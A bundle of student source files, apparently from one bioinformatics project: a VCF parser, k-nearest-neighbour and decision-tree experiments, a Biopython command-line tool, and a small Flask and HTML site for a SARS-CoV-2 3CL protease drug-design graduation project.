#         lines=[l for l in f if not l.startswith('##')]
#     return pd.read_csv(io.StringIO(''.join(lines)),dtype={'#CHROM':str,	'POS':str,'ID':str,'REF':str,'ALT':str,'QUAL':str,'FILTER':str,'INFO':str,'FORMAT':str},sep='\t').rename(columns={'#CHROM':'CHROM'})
#
#
# z=readingFile('MP.vcf')
# print(z)

# ==========================================================================================================================


from collections import OrderedDict
import gzip
import pandas as pd


VCF_HEADER = ['CHROM', 'POS', 'ID', 'REF', 'ALT', 'QUAL', 'FILTER', 'INFO']


def dataframe(filename, large=True):
    """Open an optionally gzipped VCF file and return a pandas.DataFrame with
    each INFO field included as a column in the dataframe.
    Note: Using large=False with large VCF files. It will be painfully slow.
    param filename:    An optionally gzipped VCF file.
    param large:       Use this with large VCF files to skip the ## lines and
                        leave the INFO fields unseparated as a single column.
    """
    if large:
        # Set the proper argument if the file is compressed.
        comp = 'gzip' if filename.endswith('.gz') else None
        # Count how many comment lines should be skipped.
        comments = _count_comments(filename)
        # Return a simple DataFrame without splitting the INFO column.
        return pd.read_table(filename, compression=comp, skiprows=comments,
                             names=VCF_HEADER, usecols=range(8))

    # Each column is a list stored as a value in this dict. The keys for this
    # dict are the VCF column names and the keys in the INFO column.
    result = OrderedDict()
    # Parse each line in the VCF file into a dict.
    for i, line in enumerate(lines(filename)):
        for key in line.keys():
            # This key has not been seen yet, so set it to None for all
            # previous lines.
            if key not in result:
                result[key] = [None] * i
        # Ensure this row has some value for each column.
        for key in result.keys():
            result[key].append(line.get(key, None))

    return pd.DataFrame(result)


def lines(filename):
    """Open an optionally gzipped VCF file and generate an OrderedDict for
    each line.
    """
    fn_open = gzip.open if filename.endswith('.gz') else open

    with fn_open(filename) as fh:
        for line in fh:
            if line.startswith('#'):
                continue
            else:
                yield parse(line)


def parse(line):
    """Parse a single VCF line and return an OrderedDict.
    """
    result = OrderedDict()

    fields = line.rstrip().split('\t')

    # Read the values in the first seven columns.
    for i, col in enumerate(VCF_HEADER[:7]):
        result[col] = _get_value(fields[i])

    # INFO field consists of "key1=value;key2=value;...".
    infos = fields[7].split(';')

    for i, info in enumerate(infos, 1):
        # info should be "key=value".
        try:
            key, value = info.split('=')
        # But sometimes it is just "value", so we'll make our own key.
        except ValueError:
            key = 'INFO{}'.format(i)
            value = info
        # Set the value to None if there is no value.
        result[key] = _get_value(value)

    return result


def _get_value(value):
    """Interpret null values and return ``None``. Return a list if the value
    contains a comma.
    """
    if not value or value in ['', '.', 'NA']:
        return None
    if ',' in value:
        return value.split(',')
    return value


def _count_comments(filename):
    """Count comment lines (those that start with "#") in an optionally
    gzipped file.
    param filename:  An optionally gzipped file.
    """
    comments = 0
    fn_open = gzip.open if filename.endswith('.gz') else open
    with fn_open(filename) as fh:
        for line in fh:
            if line.startswith('#'):
                comments += 1
            else:
                break
    return comments


z=dataframe('MP.vcf')
print(z)
import math
import numpy as np
from collections import Counter


def calc_mean(values):
    return sum(values) / len(values)


def calc_standard_deviation(values, mean):
    sum_diff = 0
    for v in values:
        sum_diff += math.pow(v - mean, 2)

    return math.sqrt(sum_diff / (len(values) - 1))


def normalize_data(X):
    normalized_data = np.zeros(X.shape)
    for row_i in range(len(X)):
        row = X[row_i]
        mean = calc_mean(row)
        std = calc_standard_deviation(row, mean)

        normalized_col = np.zeros(row.shape)
        for i in range(len(row)):
            normalized_col[i] = (row[i] - mean) / std

        normalized_data[row_i] = normalized_col
    return normalized_data


def euclidean_distance(x1, x2):
    distance = np.sqrt(np.sum((x1 - x2) ** 2))
    return distance


def extract_data_from_file(fileName, y_index):
    file = open(fileName)
    data = list(map(lambda line: list(map(int, filter(lambda x: x != '', line.split(' ')))), file.readlines()))
    X = np.asarray(list(map(lambda x: np.asarray(x[:y_index]), data)))
    y = np.asarray(list(map(lambda x: np.asarray(x[y_index]), data)))
    file.close()

    return normalize_data(X[:500]), y[:500]


class KNN:
    def __init__(self):
        self.init_X = None
        self.init_y = None
        self.k = None

    def fit_initial_data(self, X, y, k):
        self.init_X = X
        self.init_y = y
        self.k = k

    def classify_new_data(self, new_X, new_y):
        correct_predictions_total = 0
        for row_i in range(len(new_X)):
            row = new_X[row_i]
            predicted_class = self.classify_new_row(row)
            actual_class = new_y[row_i]
            is_correct_prediction = predicted_class == actual_class
            if is_correct_prediction:
                correct_predictions_total += 1
            print(
                f'K: {self.k} | Row: #{row_i + 1} | Predicted: {predicted_class} | Actual: {actual_class} {"✓" if is_correct_prediction else "✗"}')
        accuracy = round(correct_predictions_total / len(new_y) * 100, 2)
        return accuracy

    def classify_new_row(self, new_row):
        distances = self.get_closest_k_dists(new_row)

        k_is = list(map(lambda x: x[1], distances))
        labels = [self.init_y[i] for i in k_is]

        most_common = Counter(labels).most_common()
        return most_common[0][0]

    def get_closest_k_dists(self, new_row):
        closest_ks = []
        for row_i in range(len(self.init_X)):
            row = self.init_X[row_i]
            dist = euclidean_distance(new_row, row)
            self.add_dist(dist, row_i, closest_ks)
        return closest_ks

    def add_dist(self, dist, row_i, closest_ks):
        insert_in = 0
        for k_i in range(len(closest_ks)):
            if closest_ks[k_i][0] < dist:
                insert_in = k_i + 1
        closest_ks.insert(insert_in, (dist, row_i))

        if len(closest_ks) > self.k:
            closest_ks.pop()


classes_index = 16
X_train, y_train = extract_data_from_file('pendigits_training.txt', classes_index)
X_test, y_test = extract_data_from_file('pendigits_test.txt', classes_index)

result = {}
knn = KNN()
for k in range(1, 10):
    knn.fit_initial_data(X_train, y_train, k)
    acc = knn.classify_new_data(X_test, y_test)
    result[k] = acc

print('Done.\n')

for k in result.keys():
    acc = result[k]
    print(f'K: {k} | Correct: {acc} | All: {len(y_test)} | Acc: {acc}')

import sys
import getopt
from Bio.Seq import Seq
from Bio.SeqUtils import GC
from Bio import pairwise2
from Bio import SeqIO
from Bio.Blast import NCBIWWW
from Bio.Blast import NCBIXML


##################
####### GC #######
##################
def gc(dna):
    gc_percentage = GC(dna)
    return gc_percentage


##########################
####### Transcribe #######
##########################
def Transcribe(DNA):
    dna = Seq(DNA)
    transcribe = dna.transcribe()
    print('{}'.format(transcribe))


###################################
####### Reverse_complementt #######
###################################
def Reverse_comp(DNA):
    dna = Seq(DNA)
    reverse_complementt = dna.reverse_complement()
    print(reverse_complementt)


###########################
####### Calc_nbases #######
###########################
def Calc_nbases(DNA):
    dna = Seq(DNA)
    calc_nbases = dna.count('N')
    print(calc_nbases)


##############################
#######  Filter_nbases #######
##############################
def Filter_nbases(DNA):
    dna = Seq(DNA)
    print(dna.replace('N', ''))




#########################
######## is_valid #######
#########################
def is_valid(sequence, typee):
    dna_sequance = 'ACGT'
    rna_sequance = 'ACGU'
    protein_sequance = 'ABCDEFGHIKLMNPQRSTVWXYZabcdefghiklmnpqrstvwxyz'

    valid = True
    if typee == 'DNA' or typee == 'dna':
        for base in sequence:
            if base not in dna_sequance:
                valid = False
        return valid

    elif typee == 'RNA' or typee == 'rna':
        for base in sequence:
            if base not in rna_sequance:
                valid = False
        return valid

    elif typee == 'PROTEIN' or typee == 'protein':
        for base in sequence:
            if base not in protein_sequance:
                valid = False
        return valid
    print('The type you entered is incorrect')


######################################################
###### pairwise alignment between 2 sequances ########
######################################################

def seq_alignment(seq1, seq2, file_name):
    alignments = pairwise2.align.globalxx(seq1, seq2)
    if len(file_name) == 0:
        for alignment in alignments:
            print(pairwise2.format_alignment(*alignment))
    else:
        f = open(file_name, 'a')
        for alignment in alignments:
            f.write(pairwise2.format_alignment(*alignment))
        f.close


#####################################################################
######## pairwise alignment between 2 sequances in text files #######
#####################################################################
def seq_alignment_files(File1Path, File2Path, OutputPath):
    sequance1 = ''
    sequance2 = ''
    file1 = open(File1Path, "r")
    for line in file1:
        line = line.rstrip()  # this discard the newline at the end (if any)
        if line[0] == '>':  # if file is fasta
            sequance1 = line[1:]
        else:
            sequance1 = line[0:]
    file1.close

    file2 = open(File2Path, "r")
    for line in file2:
        line = line.rstrip()  # this discard the newline at the end (if any)
        if line[0] == '>':  # if file is fasta
            sequance2 = line[1:]
        else:
            sequance2 = line[0:]
    file2.close

    alignments = pairwise2.align.globalxx(sequance1, sequance2)
    if len(OutputPath) == 0:
        for alignment in alignments:
            print(pairwise2.format_alignment(*alignment))
    else:
        f = open(OutputPath, 'a')
        for alignment in alignments:
            f.write(pairwise2.format_alignment(*alignment))
        f.close


################################
####### online_alignment #######
################################
def online_alignment(seq, FileName):
    result_handle = NCBIWWW.qblast('blastn', 'nt', seq)
    blast_record = NCBIXML.read(result_handle)
    threshold = 0.01
    if len(FileName) == 0:
        for alignment in blast_record.alignments:
            for hsp in alignment.hsps:
                if hsp.expect < threshold:
                    print('sequence: ', alignment.title)
                    print('length: ', alignment.length)
                    print('e value: ', hsp.expect)
                    print(hsp.match)
                    print(hsp.query)
                    print(hsp.sbjct)
    else:
        f = open(FileName, 'a')
        for alignment in blast_record.alignments:
            for hsp in alignment.hsps:
                if hsp.expect < threshold:
                    f.write('sequence: ')
                    f.write(alignment.title)
                    f.write('\n')
                    f.write('length: ')
                    f.write(str(alignment.length))
                    f.write('\n')
                    f.write('e value: ')
                    f.write(str(hsp.expect))
                    f.write('\n')
                    f.write(hsp.match)
                    f.write('\n')
                    f.write(hsp.query)
                    f.write('\n')
                    f.write(hsp.sbjct)
        f.close


################################
####### convert_to_fasta #######
################################

def convert(file):
    with open(file) as input_handle, open(file + ".fasta", "w") as output_handle:
        sequences = SeqIO.parse(input_handle, "genbank")
        count = SeqIO.write(sequences, output_handle, "fasta")
        print("Converted %i records" % count)


###########################
####### merge_fasta #######
###########################
def merge(*filenames, outFile):
    if len(outFile) == 0:
        for names in filenames:
            with open(names) as infile:
                print(infile.read() + "\n")
    else:
        with open(outFile, "w") as outfile:
            for names in filenames:
                with open(names) as infile:
                    outfile.write(infile.read())
                    outfile.write("\n")


def test_getopt():
    try:
        opts, args = getopt.gnu_getopt(sys.argv[1:], 'o:h:')
    except getopt.GetoptError as err:
        print(err)
        opts = []

    for ARG in args:
        print(ARG)
        if ARG == 'gc':
            if len(args) < 2:
                print('Missing parameters')
            else:
                print(f'GC = {gc(args[1])}')

        elif ARG == 'transcribe':  # transcribe
            if len(args) < 2:
                print('Missing parameters')
            else:
                Transcribe(args[1])

        elif ARG == 'reverse_complement':  # reverse_complement
            if len(args) < 2:
                print('Missing parameters')
            else:
                Reverse_comp(args[1])

        elif ARG == 'calc_nbases':  # calc_nbases
            if len(args) < 2:
                print('Missing parameters')
            else:
                Calc_nbases(args[1])

        elif ARG == 'filter_nbases':  # filter_nbases
            if len(args) < 2:
                print('Missing parameters')
            else:
                Filter_nbases(args[1])

        elif ARG == 'is_valid':  # is_valid
            if len(args) < 3:
                print('Missing parameters')
            else:
                print(is_valid(args[1], args[2]))

        elif ARG == 'seq_alignment':  # seq_alignment
            if len(args) < 3:
                print('Missing parameters')
            else:
                if len(opts) == 0:
                    seq_alignment(args[1], args[2], '')

        elif ARG == 'seq_alignment_files':  # seq_alignment_files
            if len(args) < 3:
                print('Missing parameters')
            else:
                if len(opts) == 0:
                    seq_alignment_files(args[1], args[2], '')

        elif ARG == 'online_alignment':  # online_alignment
            if len(args) < 2:
                print('Missing parameters')
            else:
                if len(opts) == 0:
                    online_alignment(args[1], '')

        elif ARG == 'convert_to_fasta':  # convert_to_fasta
            if len(args) < 2:
                print('Missing parameters')
            else:
                convert(args[1])

        elif ARG == 'merge_fasta':  # merge_fasta
            if len(args) < 3:
                print('Missing parameters')
            else:
                if len(opts) == 0:
                    merge(*args[1:], outFile='')

        else:
            print("Enter the right command name")
        break

    for opt, ARG in opts:
        if opt in ['-o', '-h']:
            if args[0] == 'seq_alignment':  # seq_alignment
                if len(ARG) != 0:
                    seq_alignment(args[1], args[2], ARG)
                else:
                    print('option should be like "output.txt"')

            elif args[0] == 'seq_alignment_files':  # seq_alignment_files
                if len(ARG) != 0:
                    seq_alignment_files(args[1], args[2], ARG)
                else:
                    print('option should be like "output.txt"')

            elif args[0] == 'online_alignment':  # online_alignment
                if len(ARG) != 0:
                    online_alignment(args[1], ARG)
                else:
                    print('option should be like "output.txt"')

            elif args[0] == 'merge_fasta':  # merge_fasta
                if len(ARG) != 0:
                    merge(*args[1:], outFile=ARG)
                else:
                    print('option should be like "output.txt"')
        else:
            assert False, "unhandled option"

test_getopt()

import os.path
import sys

app=os.path.dirname()
print(app)

from Bio import SeqIO
from Bio import pairwise2
from Bio.Blast import NCBIWWW
from Bio.Blast import NCBIXML


def seq_alignment_files(File1Path, File2Path, OutputPath):
    sequance1 = ''
    sequance2 = ''
    file1 = open(File1Path, "r")
    for line in file1:
        line = line.rstrip()  # this discard the newline at the end (if any)
        if line[0] == '>':  # if file is fasta
            sequance1 = line[1:]
        else:
            sequance1 = line[0:]
    file1.close

    file2 = open(File2Path, "r")
    for line in file2:
        line = line.rstrip()  # this discard the newline at the end (if any)
        if line[0] == '>':  # if file is fasta
            sequance2 = line[1:]
        else:
            sequance2 = line[0:]
    file2.close

    if len(OutputPath) == 0:
        for alignment in pairwise2.align.globalxx(sequance1, sequance2):
            print(pairwise2.format_alignment(*alignment))
    else:
        f = open(OutputPath, 'a')
        for alignment in pairwise2.align.globalxx(sequance1, sequance2):
            f.write(pairwise2.format_alignment(*alignment))
        f.close

def online_alignment(seq, FileName):
    result_handle = NCBIWWW.qblast('blastn', 'nt', seq)
    blast_record = NCBIXML.read(result_handle)
    E_value_threshold = 0.01
    if len(FileName) == 0:
        for alignment in blast_record.alignments:
            for hsp in alignment.hsps:
              if hsp.expect < E_value_threshold:
                print('sequence: ', alignment.title)
                print('length: ', alignment.length)
                print('e value: ', hsp.expect)
                print(hsp.match)
                print(hsp.query)
                print(hsp.sbjct)
    else:
        f=open(FileName, 'a')
        for alignment in blast_record.alignments:
            for hsp in alignment.hsps:
              if hsp.expect < E_value_threshold:
                f.write('sequence: ')
                f.write(alignment.title)
                f.write('\n')
                f.write('length: ')
                f.write(str(alignment.length))
                f.write('\n')
                f.write('e value: ')
                f.write(str(hsp.expect))
                f.write('\n')
                f.write(hsp.match)
                f.write('\n')
                f.write(hsp.query)
                f.write('\n')
                f.write(hsp.sbjct)
        f.close

def convert(file):
    with open(file) as input_handle, open(file + ".fasta", "w") as output_handle:
        sequences = SeqIO.parse(input_handle, "genbank")
        count = SeqIO.write(sequences, output_handle, "fasta")
        print("Converted %i records" % count)


def merge(outFile,*filenames):
    if len(outFile) == 0:
        for names in filenames:
            with open(names) as infile:
                print(infile.read() + "\n")
    else:
        with open(outFile, "w") as outfile:
            for names in filenames:
                with open(names) as infile:
                    outfile.write(infile.read())
                    outfile.write("\n")

import math
import numpy as np
from collections import Counter


def calc_mean(values):
    return sum(values) / len(values)


def calc_standard_deviation(values, mean):
    sum_diff = 0
    for v in values:
        sum_diff += math.pow(v - mean, 2)

    return math.sqrt(sum_diff / (len(values) - 1))


def normalize_data(X):
    normalized_data = np.zeros(X.shape)
    for row_i in range(len(X)):
        row = X[row_i]
        mean = calc_mean(row)
        std = calc_standard_deviation(row, mean)

        normalized_col = np.zeros(row.shape)
        for i in range(len(row)):
            normalized_col[i] = (row[i] - mean) / std

        normalized_data[row_i] = normalized_col
    return normalized_data


def euclidean_distance(x1, x2):
    distance = np.sqrt(np.sum((x1 - x2) ** 2))
    return distance


def extract_data_from_file(fileName, y_index):
    file = open(fileName)
    data = list(map(lambda line: list(map(int, filter(lambda x: x != '', line.split(' ')))), file.readlines()))
    X = np.asarray(list(map(lambda x: np.asarray(x[:y_index]), data)))
    y = np.asarray(list(map(lambda x: np.asarray(x[y_index]), data)))
    file.close()

    return normalize_data(X[:500]), y[:500]


class KNN:
    def __init__(self, k=3):
        self.k = k
        self.X_train = None
        self.y_train = None

    def fit(self, X, y):
        self.X_train = X
        self.y_train = y

    def predict(self, X, y):
        correct_predictions_total = 0
        for row_i in range(len(X)):
            row = X[row_i]
            predicted_class = self._predict(row)
            actual_class = y[row_i]
            is_correct_prediction = predicted_class == actual_class
            if is_correct_prediction:
                correct_predictions_total += 1
            print(
                f'K: {self.k} | Row: #{row_i+1} | Predicted: {predicted_class} | Actual: {actual_class} {"✓" if is_correct_prediction else "✗"}')
        accuracy = round(correct_predictions_total / len(y) * 100, 2)
        return accuracy

    def _predict(self, x):
        # compute the distance
        distances = [euclidean_distance(x, x_train) for x_train in self.X_train]

        # get the closest k
        k_indices = np.argsort(distances)[:self.k]
        k_nearest_labels = [self.y_train[i] for i in k_indices]

        # majority voye
        most_common = Counter(k_nearest_labels).most_common()
        return most_common[0][0]


classes_index = 16
X_train, y_train = extract_data_from_file('pendigits_training.txt', classes_index)
X_test, y_test = extract_data_from_file('pendigits_test.txt', classes_index)

result = {}
for k in range(1, 10):
    knn = KNN(k)
    knn.fit(X_train, y_train)
    acc = knn.predict(X_test, y_test)
    result[k] = acc

print('Done.\n')

for k in result.keys():
    acc = result[k]
    print(f'K: {k} | Correct: {acc} | All: {len(y_test)} | Acc: {acc}')

import pandas as pn
from sklearn import preprocessing
import matplotlib as plt
from sklearn import tree
import statistics
import random

house_votes = pn.read_csv(r"E:\Bioninformatics\year4,sem1\Machine Learning and Bioinformatics\Assignments\house-votes-84.data", header=None)
copy = house_votes
outputY = house_votes[0]

features = copy.drop(columns=copy.columns[0])

modeCol = features.mode()
modeColStr = str(modeCol)
modeColSplit = modeColStr.split()
st = int(len(modeColSplit)/2)+1
modeLast = modeColSplit[st:]

# print(modeCol, "\n", modeColStr, "\n", modeColSplit, "\n", modeLast)
i = 0

process = preprocessing.LabelEncoder()
outProcess = preprocessing.LabelEncoder()
for x in features:
    features[x] = features[x].replace({"?": modeLast[i]})
    process.fit(features[x])
    features[x] = process.transform(features[x])
    i = i + 1

outProcess.fit(outputY)
outputY = outProcess.transform(outputY)

dt = tree.DecisionTreeClassifier()

rangeList = [30, 40, 50, 60, 70, 80]
accuracy = []
sizList = []

accuracyX = []
sizListX = []
accuracyt = []
splits = []
# Random 25% splits
for x in range(3):
    counterX = 0
    split = random.randint(1, int(len(features) - (len(features) * 0.25)))
    siz = int(split + len(features) * 0.25)
    # print(split, siz, len(outputY))
    dt = dt.fit(features[split:siz], outputY[split:siz])
    outA = dt.predict(features[siz:])
    outB = dt.predict(features[:split])
    for x in range(len(outputY[siz:])):
        if siz == len(outputY) - 1:
            # print("BROKE")
            break
        elif outA[x] == outputY[siz:][x]:
            counterX += 1
    for x in range(len(outputY[:split])):
        if split == 0:
            # print("0, break")
            break
        if outB[x] == outputY[:split][x]:
            counterX += 1
    accuracyX.append((counterX / (len(outputY[siz:]) + len(outputY[:split])) * 100))
    nodeSize = dt.tree_.node_count
    sizListX.append(nodeSize)

print("Accuracy of random 25% splitting: ", accuracyX)
print("Tree Size of random 25% splitting: ", sizListX)

accStat = []
sizeStat = []
for i in rangeList:
    sizListt = []
    accuracyt = []
    spli = []
    for x in range(5):
        counter = 0
        split1 = random.randint(1, int(len(features) - (len(features) * (i / 100))))
        siz2 = int(split1 + (len(features) * (i / 100)))
        dt = dt.fit(features[:siz2], outputY[:siz2])
        outA = dt.predict(features[siz2:])
        for x in range(len(outputY[siz2:])):
            if outA[x] == outputY[siz2:][x]:
                counter += 1
        accuracyt.append((counter / len(outputY[siz2:])) * 100)
        siz = dt.tree_.node_count
        sizListt.append(siz)
        spli.append(siz2)
    accStat.append(statistics.mean(accuracyt))
    accStat.append(max(accuracyt))
    accStat.append(min(accuracyt))

    sizeStat.append(statistics.mean(sizListt))
    sizeStat.append(max(sizListt))
    sizeStat.append(min(sizListt))

    accuracy.append(max(accuracyt))
    ind = accuracyt.index(max(accuracyt))
    sizList.append(sizListt[ind])
    splits.append(spli[ind])

j = 0
for i in range(0, len(accStat), 3):
    print("Mean of the tree size with different train sizes: ", sizeStat[i])
    print("Min size of the nodes in the tree with different train sizes: ", sizeStat[i+1])
    print("Max size of the nodes in the tree with different train sizes: ", sizeStat[i+2])
    print("Mean of Accuracies with random splits of size ", rangeList[j], ":", accStat[i])
    print("Max of Accuracies with random splits of size ", rangeList[j], ":", accStat[i+1])
    print("Min of Accuracies with random splits of size ", rangeList[j], ":", accStat[i+2], "\n")
    j += 1

index = accuracy.index(max(accuracy))
dt = dt.fit(features[:splits[index]], outputY[:splits[index]])
outA = dt.predict(features[splits[index]:])

plt.pyplot.plot(rangeList, sizList, color='black', linewidth=1, marker='o', markerfacecolor='pink', markersize=8)
plt.pyplot.show()

plt.pyplot.plot(rangeList, accuracy, color='black', linewidth=1, marker='o', markerfacecolor='purple', markersize=8)
plt.pyplot.show()

tree.plot_tree(dt, filled=True)
# fig = plt.pyplot.figure(figsize=(25, 20))
plt.pyplot.show()

import os

import requests
from flask import Flask, render_template, request, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)

allowed_exe = 'csv'


# def allowed_files(filename):
#     return '.' in filename and \
#            filename.rsplit('.', 1)[1].lower() in allowed_exe



def model(csv):
    return


@app.route('/')
def index():
    return render_template('index.html')

# path='C:/Users/jaguar/PycharmProjects/projects/DATA1.csv'

# @app.route('/', methods=['GET'])
# def upload():
#     if request.method == 'POST':
#         files = request.files['file']
#         if files:
#             files.save(os.path.join(path, files.filename))
#             output = [
#                 'CC(C)NC(C)CN', 'CC1=NC2CCC12F', 'FC1NCC2CN=C1C2', 'CCCC(C)(N)C(C)=O', 'CC(=O)N(C)N.CCC', 'CCCCCC(C)N',
#                 'CNCCCC(C)N', 'CCCCC(=O)N(C)N', 'CNCCC1CCNC1', 'CCCC(=O)N(C)N', 'CCCN(C)CNC', 'CC1NCCC1CN',
#                 'CCCC1CNC1=O', 'CCNCC1CCNC1', 'CCCCC(=O)N(C)N', 'CCNCC1CCNO1', 'CCCCC(F)(F)F',
#                 'CCCC1CNC1=O', 'CC(C)F.O=C1NCO1']
#             with open('file.csv','w') as f:
#                 for i in output:
#                     f.write(i)
#             f.close()
#             return output
#     return render_template('base.html')


if __name__ == '__main__':
    app.run(debug=True)


(function ($) {
    "use strict";

    
    /*==================================================================
    [ Validate ]*/
    var name = $('.validate-input input[name="name"]');
    var email = $('.validate-input input[name="email"]');
    var subject = $('.validate-input input[name="subject"]');
    var message = $('.validate-input textarea[name="message"]');


    $('.validate-form').on('submit',function(){
        var check = true;

        if($(name).val().trim() == ''){
            showValidate(name);
            check=false;
        }

        if($(subject).val().trim() == ''){
            showValidate(subject);
            check=false;
        }


        if($(email).val().trim().match(/^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{1,5}|[0-9]{1,3})(\]?)$/) == null) {
            showValidate(email);
            check=false;
        }

        if($(message).val().trim() == ''){
            showValidate(message);
            check=false;
        }

        return check;
    });


    $('.validate-form .input1').each(function(){
        $(this).focus(function(){
           hideValidate(this);
       });
    });

    function showValidate(input) {
        var thisAlert = $(input).parent();

        $(thisAlert).addClass('alert-validate');
    }

    function hideValidate(input) {
        var thisAlert = $(input).parent();

        $(thisAlert).removeClass('alert-validate');
    }
    
    

})(jQuery);

function model(){
    temp=`
            <h2 style='color:#0d6efd':>Generated Molecules</h2>
            <ol>
                        <li>CC(C)NC(C)CN</li>
                        <li>CCCCCC(C)N</li>
                        <li>CC(=O)N(C)N.CCC</li>
                        <li>CCCC(C)(N)C(C)=O</li>
                        <li>FC1NCC2CN=C1C2</li>
                        <li>CC1=NC2CCC12F</li>
                        <li>CNCCCC(C)N</li>
                        <li>CNCCC1CCNC1</li>
                    </ol>
                <ol>
                    <li>CCCN(C)CNC</li>
                        <li>CC1NCCC1CN</li>
                        <li>CCNCC1CCNC1</li>
                        <li>CCCCC(=O)N(C)N</li>
                        <li>CCCC(=O)N(C)N</li>
                        <li>CCCC1CNC1=O</li>
                        <li>CCNCC1CCNO1</li>
                        <li>CCCCC(F)(F)F</li>
                        <li>CC(C)F.O=C1NCO1</li>
                        <li>CCCC1CNC1=O</li>
                </ol>
    `
    document.getElementById("output").innerHTML = temp;
}


const hamburger_menuu = document.querySelector(".hamburger-menuu");
const containerr = document.querySelector(".containerr");

hamburger_menuu.addEventListener("click", () => {
  containerr.classList.toggle("active");
});

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Graduation Project</title>
    <link rel="stylesheet" href="static/bootstrap-5.0.2-dist/css/bootstrap.min.css"/>
    <link rel="stylesheet" href="static/css/main.css"/>
    <!--===============================================================================================-->
    <!--    <link rel="icon" type="image/png" href="static/css/images/icons/favicon.ico"/>-->
    <!--===============================================================================================-->
    <!--    <link rel="stylesheet" type="text/css" href="static/css/vendor/bootstrap/css/bootstrap.min.css">-->
    <!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/css/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
    <!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/css/vendor/animate/animate.css">
    <!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/css/vendor/css-hamburgers/hamburgers.min.css">
    <!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/css/vendor/select2/select2.min.css">
    <!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="css/util.css">
    <link rel="stylesheet" type="text/css" href="static/css/css/main1.css">
    <!--===============================================================================================-->
</head>
<body>
<div class="containerr">
    <div class="navbarr">
        <div class="menuu">
            <h3 class="logoo">GP<span> Project</span></h3>
            <div class="hamburger-menuu">
                <div class="barr"></div>
            </div>
        </div>
    </div>

    <div class="main-containerr" id="Home">
        <div class="mainn">
            <header>
                <div class="overlayy">
                    <div class="innerr">
                        <h2 class="titlee">
                            <span class="I-letters">G</span>
                            <span class="letterO">P</span>
                        </h2>
                        <p style="color:offwhite;">
                            Drug design for 3CL pro SARS-cov2 mutations
                        </p>
                        <button class="bttnn">About Us</button>
                    </div>
                </div>
            </header>
        </div>

        <div class="shadoww one"></div>
        <div class="shadoww two"></div>
    </div>
    <nav>
        <div class="links">
            <ul>
                <li>
                    <a href="#Home" style="--i: 0.05s">Home</a>
                </li>
                <li>
                    <a href="#About" style="--i: 0.15s">About Us</a>
                </li>
                <li>
                    <a href="#Tools" style="--i: 0.10s">Tool</a>
                </li>
                <li>
                    <a href="#Team" style="--i: 0.25s">Team</a>
                </li>
                <li>
                    <a href="#Contact" style="--i: 0.3s">Contact Us</a>
                </li>
            </ul>
        </div>
    </nav>
</div>
<section class="vh-100" id="About">
    <div class="container-fluid">
        <div class="row justify-content-center align-items-center">
            <div class="col-lg-12">
                <div class="text-center py-4">
                    <h1>About US</h1>
                    <p>Drug design for 3CL pro SARS-cov2 mutations</p>
                </div>
            </div>
            <div class="col-sm-1 col-lg-3">
                <img src="static/css/6lu7_assembly-1.jpeg">
            </div>
            <div class="col-sm-6 col-lg-6 offset-lg-1">
                <p class="py-3">
                    The main protease found in coronaviruses.
                    The project analyzes 3CL protease mutations, identifying enzymatic activity, viral load, and
                    processive mutations, providing a comprehensive study.
                </p>
            </div>
        </div>
    </div>
</section>

<section class="vh-100" id="Tools">
    <div class="container-fluid text-center ">
        <div class="row justify-content-center align-items-center">
            <div class="col-lg-12"><h1>Tools</h1>
                <label>File:</label>
                <input type="file" class="btn btn-outline-primary rounded rounded-pill">
                <button type="submit" onclick="model()" class="btn btn-primary rounded rounded-pill">Upload</button>
            </div>
            <div id="output" class="col-lg-4">

            </div>
        </div>
    </div>
</section>

<section class="vh-100 gallery " id="Team">
    <div class="container-fluid">
        <div class="row text-center justify-content-center align-items-center">
            <div class="col-lg-12">
                <h1>Team</h1>
            </div>
            <div class="col-lg-10">
                <div id="carouselExampleIndicators" class="carousel slide py-4" data-ride="carousel">
                    <div class="carousel-inner">
                        <div class="carousel-item active">
                            <div class="container">
                                <div class="row">
                                    <div class="col-lg-9 mx-auto text-center">
                                        <img src="static/css/WhatsApp Image 2023-04-16 at 21.57.47.jpg"
                                             class="img-fluid rounded-circle feedback">
                                        <div class="py-3 border border-secondary border-3">
                                            <h5 class="mt-5">Yehia</h5>
                                            <p class="job">Web Developer</p>
                                        </div>

                                    </div>

                                </div>
                            </div>
                        </div>
                        <div class="carousel-item ">
                            <div class="container">
                                <div class="row">
                                    <div class="col-lg-9 mx-auto text-center">
                                        <img src="static/css/amira3.png"
                                             class="img-fluid rounded-circle feedback">
                                        <div class="py-3 border border-secondary border-3">
                                            <h5 class="mt-5">Amira Kadry</h5>
                                            <p class="job">Data Scientist</p>
                                        </div>

                                    </div>

                                </div>
                            </div>
                        </div>
                        <div class="carousel-item ">
                            <div class="container">
                                <div class="row">
                                    <div class="col-lg-9 mx-auto text-center">
                                        <img src="static/css/Raina.jpg"
                                             class="img-fluid rounded-circle feedback">
                                        <div class="py-3 border border-secondary border-3">
                                            <h5 class="mt-5">Raina Ismail</h5>
                                            <p class="job">Bioinformatics</p>
                                        </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                        <div class="carousel-item ">
                            <div class="container">
                                <div class="row">
                                    <div class="col-lg-9 mx-auto text-center">
                                        <img src="static/css/YASMIN.png"
                                             class="img-fluid rounded-circle feedback">
                                        <div class="py-3 border border-secondary border-3">
                                            <h5 class="mt-5">Yasmin Hossam</h5>
                                            <p class="job">Bioinformatics</p>
                                        </div>

                                    </div>

                                </div>
                            </div>
                        </div>
                        <div class="carousel-item ">
                            <div class="container">
                                <div class="row">
                                    <div class="col-lg-9 mx-auto text-center">
                                        <img src="static/css/ghada.jpg"
                                             class="img-fluid rounded-circle feedback">
                                        <div class="py-3 border border-secondary border-3">
                                            <h5 class="mt-5">Ghada</h5>
                                            <p class="job">Web Design</p>
                                        </div>

                                    </div>

                                </div>
                            </div>
                        </div>
                        <!--                        <div class="carousel-item">-->
